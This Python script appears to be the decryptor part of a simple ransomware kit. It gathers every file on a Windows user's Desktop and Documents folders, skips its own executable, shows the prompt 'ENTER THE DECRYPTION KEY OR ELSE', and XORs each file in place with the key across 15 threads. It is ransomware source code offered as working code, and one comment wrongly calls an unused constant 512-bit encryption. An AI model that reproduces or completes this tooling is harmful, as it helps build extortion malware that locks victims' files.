import os, threading, queue


def decrypt(key):
    while True:
        file = q.get()
        print(f"Decrypting {file}")
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ""
            with open(file, "rb") as f:
                data = f.read()
            with open(file, "w") as f:
                f.write("")
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, "ab") as f:
                    f.write(xor_byte.to_bytes(1, "little"))
                # Increment the key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print("File successfully decrypted!")
        except:
            print("Failed to decrypt file!")
        q.task_done()


# Encryption information
ENCRYPTION_LEVEL = 512 // 80  # 512-bit encryption = 64 bytes
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()"
CHARSET_LENGTH = len(CHARSET)

# Grab filenames to decrypt
print("Preparing files...")
desktop_path = os.environ["USERPROFILE"] + "/Desktop"
documents_path = os.environ["USERPROFILE"] + "/Documents"

desktop_files = os.listdir(desktop_path)
documents_files = os.listdir(documents_path)

abs_files = []

for f in desktop_files:
    if os.path.isfile(f"{desktop_path}/{f}") and f != __file__[:-2] + "exe":
        abs_files.append(f"{desktop_path}/{f}")

for f in documents_files:
    if os.path.isfile(f"{documents_path}/{f}") and f != __file__[:-2] + "exe":
        abs_files.append(f"{documents_path}/{f}")

print("Successfully located all files!")

key = input("ENTER THE DECRYPTION KEY OR ELSE:")

# Set up queue with jobs for threads to decrypt
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Set up threads to get ready for decryption
for i in range(15):
    t = threading.Thread(target=decrypt, args=(key, ), daemon=True)
    t.start()

q.join()
print("Decryption done!")
input()